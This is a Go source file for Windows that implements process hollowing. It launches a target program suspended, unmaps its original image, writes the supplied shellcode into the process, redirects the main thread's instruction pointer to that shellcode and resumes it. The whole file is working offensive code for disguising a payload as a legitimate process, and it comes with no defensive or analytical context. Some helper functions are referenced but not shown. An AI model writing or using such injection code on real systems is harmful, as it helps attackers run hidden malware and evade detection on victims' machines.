//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	procReadProcessMemory = k32.NewProc("ReadProcessMemory")
)

func hollowProcess(targetPath string, shellcode []byte) error {
	exePtr, _ := syscall.UTF16PtrFromString(targetPath)
	var si startupInfoExW
	si.cb = uint32(unsafe.Sizeof(si))
	si.dwFlags = 0x00000001
	var pi processInformation

	ret, _, _ := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(exePtr)), 0, 0, 0, 0,
		uintptr(createSuspended), 0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcessW failed for %s", targetPath)
	}
	hProc := pi.hProcess
	hThread := pi.hThread
	defer procCloseHandle.Call(hProc)
	defer procCloseHandle.Call(hThread)

	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procNtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	var pbi [48]byte
	r1, _, _ := procNtQueryInformationProcess.Call(
		hProc, 0, uintptr(unsafe.Pointer(&pbi[0])),
		uintptr(len(pbi)), 0,
	)
	if r1 != 0 {
		procTerminateProcess.Call(hProc, 1)
		return fmt.Errorf("NtQueryInformationProcess failed")
	}
	pebAddr := *(*uintptr)(unsafe.Pointer(&pbi[16]))

	var pebBuf [24]byte
	var read uint32
	r2, _, _ := procReadProcessMemory.Call(
		hProc, pebAddr, uintptr(unsafe.Pointer(&pebBuf[0])),
		uintptr(len(pebBuf)), uintptr(unsafe.Pointer(&read)),
	)
	if r2 == 0 {
		procTerminateProcess.Call(hProc, 1)
		return fmt.Errorf("ReadProcessMemory PEB failed")
	}
	imageBase := *(*uintptr)(unsafe.Pointer(&pebBuf[16]))

	procNtUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")
	r3, _, _ := procNtUnmapViewOfSection.Call(hProc, imageBase)
	if r3 != 0 {
		procTerminateProcess.Call(hProc, 1)
		return fmt.Errorf("NtUnmapViewOfSection failed: 0x%X", r3)
	}

	addr, err := allocateRX(hProc, shellcode)
	if err != nil {
		procTerminateProcess.Call(hProc, 1)
		return fmt.Errorf("allocateRX failed: %w", err)
	}

	var ctx threadContext
	ctx.contextFlags = CONTEXT_FULL
	r4, _, _ := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	if r4 == 0 {
		procTerminateProcess.Call(hProc, 1)
		return fmt.Errorf("GetThreadContext failed")
	}

	ctx.rip = uint64(addr)
	procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	procResumeThread.Call(hThread)

	return nil
}
